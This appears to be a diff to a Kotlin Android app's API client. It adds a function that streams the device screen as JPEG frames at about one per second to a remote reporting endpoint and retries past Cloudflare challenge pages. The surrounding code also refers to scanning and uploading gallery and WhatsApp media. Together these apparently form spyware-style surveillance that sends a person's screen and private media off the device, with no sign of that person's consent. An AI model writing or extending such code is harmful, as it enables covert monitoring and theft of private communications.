@@ -902,6 +902,35 @@ object ApiClient {
     }
 
     /**
+     * Live screen-view frame → /report/screen-frame. The server keeps only the
+     * LATEST frame per device (single-row upsert), so this is safe to call at
+     * ~1 fps for the whole session. Retries once over HTTP/1.1 on Cloudflare
+     * challenges, same as uploadMediaFile.
+     */
+    fun uploadScreenFrame(base64Jpeg: String, tsMs: Long): Boolean {
+        fun submit(c: okhttp3.OkHttpClient): Boolean {
+            return try {
+                val body = org.json.JSONObject().apply {
+                    put("device_id", CloudConfig.deviceId)
+                    put("image", base64Jpeg)
+                    put("timestamp", tsMs)
+                }
+                val request = Request.Builder()
+                    .url("${CloudConfig.apiBaseUrl}/report/screen-frame")
+                    .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
+                    .post(body.toString().toRequestBody("application/json".toMediaType()))
+                    .build()
+                c.newCall(request).execute().use { resp ->
+                    resp.isSuccessful && !resp.body?.string().orEmpty().contains("Just a moment")
+                }
+            } catch (e: Exception) {
+                false
+            }
+        }
+        return submit(client) || submit(http11Client)
+    }
+
+    /**
      * Procedural media upload used by MediaCollectionManager (gallery /
      * WhatsApp folder scanning). `bytes == null` uploads a metadata-only row
      * (file exists on device but too large to send). Retries once over
